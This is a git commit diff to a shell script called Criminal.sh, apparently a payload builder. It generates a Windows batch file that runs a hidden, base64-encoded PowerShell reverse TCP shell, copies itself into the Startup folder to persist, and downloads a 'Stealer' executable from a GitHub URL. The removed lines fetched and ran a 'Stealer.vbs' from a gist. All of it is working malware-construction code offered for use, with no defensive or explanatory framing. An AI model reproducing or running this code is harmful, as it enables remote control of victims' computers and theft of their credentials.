1f9706696a741d1909359c28c841f3840d00eb81
darkuser744 <70851040+darkuser744@users.noreply.github.com>
2020-10-12 18:31:17 +0530

    Update Criminal.sh

--- Criminal.sh
+++ Criminal.sh
@@ -43,12 +43,11 @@ sed -i 's/_ipaddress_/'$ip'/g' powershell_reverse_tcp.txt
 sed -i 's/_port_/'$port'/g' powershell_reverse_tcp.txt
 printf "\e\n[1;93m^_^ Coverting Powershell File(.ps1) To Batch File(.bat) ^_^\e[0m\n"
 sleep 1
-echo -e '''copy %0 "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"''' >> $ps_tcp.bat
+echo -e "@echo off" >> $ps_tcp.bat 
 echo -e "cd %temp%" >> $ps_tcp.bat
-echo -e '''powershell -win hidden -ExecutionPolicy bypass -NoProfile;wget -o Stealer.vbs "https://gist.githubusercontent.com/darkuser744/1b307ea87dda596ea95b3e0053f59962/raw/e039823f7e11e92d6db5f80b13b7a159eb66b22a/.txt"''' >> $ps_tcp.bat
-echo -e "start Stealer.vbs " >> $ps_tcp.bat
-echo -n "powershell -noexit -nologo -win hidden -ExecutionPolicy bypass -NoProfile -EncodedCommand " >> $ps_tcp.bat;pwsh -c "[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes([IO.File]::ReadAllText('powershell_reverse_tcp.txt')))" >> $ps_tcp.bat
-echo -e "exit /b" >> $ps_tcp.bat
+echo -e '''copy %0 "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"''' >> $ps_tcp.bat
+echo -n "powershell -executionpolicy bypass -windowstyle hidden -e " >> $ps_tcp.bat;pwsh -c "[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes([IO.File]::ReadAllText('powershell_reverse_tcp.txt')))" >> $ps_tcp.bat
+echo -n "powershell -executionpolicy bypass -windowstyle hidden wget -o Stealer.exe "https://github.com/r00t-3xp10it/meterpeter/raw/master/mimiRatz/DarkRCovery.exe" >> $ps_tcp.bat 
 rm -rf powershell_reverse_tcp.txt
 sleep 1
 printf "\e[1;36m Payload Is Created SuccessFully.\e[0m\n"
